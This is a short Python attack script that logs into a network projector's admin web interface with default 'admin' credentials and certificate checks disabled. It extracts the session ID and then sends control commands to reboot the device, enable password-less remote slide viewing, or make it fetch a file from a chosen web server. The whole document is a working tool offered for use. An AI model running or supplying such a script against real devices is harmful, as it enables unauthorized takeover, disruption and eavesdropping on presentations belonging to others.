#!/usr/bin/python3

#------------------------------------------------------------------------------------
#
#   Purpose: Admin Login Script
#
#   Version: 1
#
#   Date: 9/18/2019
#
#-------------------------------------------------------------------------------------

import requests

print("Trying to login now")

#Admin Creds
username="admin"
password="admin"

#Target
host="10.103.36.87"

#URL of Projector
url="https://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"

#POST Data
data = {
    'login': 'admin',
    'account': 'admin',
    'password':'admin',
    'Login.x':'56',
    'Login.y':'16'

}

#Send Login Request
login = requests.post(url = url, data = data, verify=False)

#Pull Out Cookie So You Can Keep Making Requests
cookieStart=login.text.split("document.write(\"<form name=\'form0\' action=\'/cgi-bin/reboot.cgi?lang=en&")
cookieMid=cookieStart[1].split("'")
cookie=cookieMid[0]
print(cookie)

action="Reboot"
if action == "Remote":
    #Turn Remove View Off
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command":"<Send><seid>"+ cookie +"</seid><name>SLIDES_ALWAYS_SEND</name><value>1</value><name>SLIDES_PASSWORD</name><value>0</value><name>SLIDES_SECOND</name><value>0</value></Send>"
    }
    remoteViewOn = requests.post(url=url,data=data, verify=False)
    print("Remote View Active")
elif action == "Reboot":
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
    }
    remoteViewOn = requests.post(url=url,data=data, verify=False)
    print("Reboot Incoming")
elif action == "Web":
    WebServer="YourTargetHere"
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command"	:"<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + WebServer + "</address><logo>TheWeb.png</logo></upload></Send>"
    }
    remoteViewOn = requests.post(url=url,data=data, verify=False)
    print("Web Request Sent")
